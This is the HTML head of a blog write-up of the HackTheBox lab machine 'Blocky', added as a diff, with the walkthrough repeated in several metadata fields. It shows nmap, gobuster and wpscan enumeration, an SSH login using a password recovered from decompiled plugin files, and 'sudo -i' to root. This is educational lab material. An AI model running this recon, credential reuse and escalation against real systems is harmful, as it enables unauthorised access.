@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HackTheBox Blocky | DC0deZer0</title>
+<meta name="generator" content="Jekyll v4.2.0">
+<meta property="og:title" content="HackTheBox Blocky">
+<meta name="author" content="Jeevan Chandra">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Let’s get started As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT Nmap scan report for 10.10.10.37 Host is up (0.015s latency). PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 ProFTPD 1.3.5a 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft &amp;#8211; Under Construction! 8192/tcp closed sophos reset ttl 63 25565/tcp open minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux This Looks like a wordpress site Gobuster Let’s find out the other files and dir on the wordpress site. =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@FireFart) =============================================================== [+] Url: http://10.10.10.37 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.php (Status: 301) /javascript (Status: 301) /phpmyadmin (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /wiki (Status: 301) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-includes (Status: 301) =============================================================== Finding Users using WPSCAN Checking the users…. _____________________ __ ___ ___ \ \ / / __ \ / __| \ \ /\ / /| |) | (_ ___ __ _ _ __ ® \ \/ \/ / | __/ ___ \ / __|/ _` | ‘ \ /\ / | | __) | (| (| | | | | \/ \/ || |/ _|_,|| |_| WordPress Security Scanner by the WPScan Team Version 3.8.2 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.37/ [10.10.10.37] Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://10.10.10.37/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; | - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3' [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods) Checking Known Locations -: |==============================================================================================================================================================================================================================================| [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentyfifteen | Location: http://10.10.10.37/wp-content/themes/twentyfifteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.6 | Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500 | | Version: 1.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8' [+] twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3' [+] twentysixteen | Location: http://10.10.10.37/wp-content/themes/twentysixteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt | [!] The version is out of date, the latest version is 2.1 | Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css | Style Name: Twenty Sixteen | Style URI: https://wordpress.org/themes/twentysixteen/ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3' [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations -: |==============================================================================================================================================================================================================================================| [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================| [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Requests Done: 2989 [+] Cached Requests: 66 [+] Data Sent: 742.701 KB [+] Data Received: 418.53 KB [+] Memory used: 227.039 MB [+] Elapsed time: 00:00:13 So the user identified as notch [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Doing a little bit of more ennumeration, something strange comes in place of PLUGINS directory. Enumerating a bit more deeper Download both files and we’ll use a java decompiler such as jad to view the contents of the files. I use JD-Gui to be decompile the java files. As the username and password are found let’s login via SSH sh notch@10.10.10.37 notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22 #Check what we can do with the account notch@Blocky:~$ Getting User.txt notch@Blocky:~$ cat user.txt 5************************ Getting Root.txt notch@Blocky:~$ sudo -l [sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User notch may run the following commands on Blocky: (ALL : ALL) ALL As the user has permission to ALL we can run sudo -i to get ROOT. notch@Blocky:~$ sudo -i root@Blocky:~# cat root.txt 0************************">
+<meta property="og:description" content="Let’s get started As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT Nmap scan report for 10.10.10.37 Host is up (0.015s latency). PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 ProFTPD 1.3.5a 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft &amp;#8211; Under Construction! 8192/tcp closed sophos reset ttl 63 25565/tcp open minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux This Looks like a wordpress site Gobuster Let’s find out the other files and dir on the wordpress site. =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@FireFart) =============================================================== [+] Url: http://10.10.10.37 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.php (Status: 301) /javascript (Status: 301) /phpmyadmin (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /wiki (Status: 301) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-includes (Status: 301) =============================================================== Finding Users using WPSCAN Checking the users…. _____________________ __ ___ ___ \ \ / / __ \ / __| \ \ /\ / /| |) | (_ ___ __ _ _ __ ® \ \/ \/ / | __/ ___ \ / __|/ _` | ‘ \ /\ / | | __) | (| (| | | | | \/ \/ || |/ _|_,|| |_| WordPress Security Scanner by the WPScan Team Version 3.8.2 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.37/ [10.10.10.37] Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://10.10.10.37/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; | - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3' [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods) Checking Known Locations -: |==============================================================================================================================================================================================================================================| [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentyfifteen | Location: http://10.10.10.37/wp-content/themes/twentyfifteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.6 | Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500 | | Version: 1.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8' [+] twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3' [+] twentysixteen | Location: http://10.10.10.37/wp-content/themes/twentysixteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt | [!] The version is out of date, the latest version is 2.1 | Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css | Style Name: Twenty Sixteen | Style URI: https://wordpress.org/themes/twentysixteen/ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3' [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations -: |==============================================================================================================================================================================================================================================| [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================| [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Requests Done: 2989 [+] Cached Requests: 66 [+] Data Sent: 742.701 KB [+] Data Received: 418.53 KB [+] Memory used: 227.039 MB [+] Elapsed time: 00:00:13 So the user identified as notch [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Doing a little bit of more ennumeration, something strange comes in place of PLUGINS directory. Enumerating a bit more deeper Download both files and we’ll use a java decompiler such as jad to view the contents of the files. I use JD-Gui to be decompile the java files. As the username and password are found let’s login via SSH sh notch@10.10.10.37 notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22 #Check what we can do with the account notch@Blocky:~$ Getting User.txt notch@Blocky:~$ cat user.txt 5************************ Getting Root.txt notch@Blocky:~$ sudo -l [sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User notch may run the following commands on Blocky: (ALL : ALL) ALL As the user has permission to ALL we can run sudo -i to get ROOT. notch@Blocky:~$ sudo -i root@Blocky:~# cat root.txt 0************************">
+<link rel="canonical" href="https://jeevanachandra.github.io//hackthebox/retired/2020/03/16/Blocky.html">
+<meta property="og:url" content="https://jeevanachandra.github.io//hackthebox/retired/2020/03/16/Blocky.html">
+<meta property="og:site_name" content="DC0deZer0">
+<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/blocky.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2020-03-16T22:04:00+05:30">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/blocky.png">
+<meta property="twitter:title" content="HackTheBox Blocky">
+<script type="application/ld+json">
+{"description":"Let’s get started As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT Nmap scan report for 10.10.10.37 Host is up (0.015s latency). PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 ProFTPD 1.3.5a 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft &amp;#8211; Under Construction! 8192/tcp closed sophos reset ttl 63 25565/tcp open minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux This Looks like a wordpress site Gobuster Let’s find out the other files and dir on the wordpress site. =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@FireFart) =============================================================== [+] Url: http://10.10.10.37 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.php (Status: 301) /javascript (Status: 301) /phpmyadmin (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /wiki (Status: 301) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-includes (Status: 301) =============================================================== Finding Users using WPSCAN Checking the users…. _____________________ __ ___ ___ \\ \\ / / __ \\ / __| \\ \\ /\\ / /| |) | (_ ___ __ _ _ __ ® \\ \\/ \\/ / | __/ ___ \\ / __|/ _` | ‘ \\ /\\ / | | __) | (| (| | | | | \\/ \\/ || |/ _|_,|| |_| WordPress Security Scanner by the WPScan Team Version 3.8.2 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.37/ [10.10.10.37] Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://10.10.10.37/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; | - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: &#39;Version: 1.3&#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods) Checking Known Locations -: |==============================================================================================================================================================================================================================================| [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentyfifteen | Location: http://10.10.10.37/wp-content/themes/twentyfifteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.6 | Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500 | | Version: 1.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: &#39;Version: 1.8&#39; [+] twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: &#39;Version: 1.3&#39; [+] twentysixteen | Location: http://10.10.10.37/wp-content/themes/twentysixteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt | [!] The version is out of date, the latest version is 2.1 | Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css | Style Name: Twenty Sixteen | Style URI: https://wordpress.org/themes/twentysixteen/ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: &#39;Version: 1.3&#39; [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations -: |==============================================================================================================================================================================================================================================| [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================| [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Requests Done: 2989 [+] Cached Requests: 66 [+] Data Sent: 742.701 KB [+] Data Received: 418.53 KB [+] Memory used: 227.039 MB [+] Elapsed time: 00:00:13 So the user identified as notch [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Doing a little bit of more ennumeration, something strange comes in place of PLUGINS directory. Enumerating a bit more deeper Download both files and we’ll use a java decompiler such as jad to view the contents of the files. I use JD-Gui to be decompile the java files. As the username and password are found let’s login via SSH sh notch@10.10.10.37 notch@10.10.10.37&#39;s password: 8YsqfCTnvxAUeduzjNSXe22 #Check what we can do with the account notch@Blocky:~$ Getting User.txt notch@Blocky:~$ cat user.txt 5************************ Getting Root.txt notch@Blocky:~$ sudo -l [sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User notch may run the following commands on Blocky: (ALL : ALL) ALL As the user has permission to ALL we can run sudo -i to get ROOT. notch@Blocky:~$ sudo -i root@Blocky:~# cat root.txt 0************************","dateModified":"2020-03-16T22:04:00+05:30","datePublished":"2020-03-16T22:04:00+05:30","headline":"HackTheBox 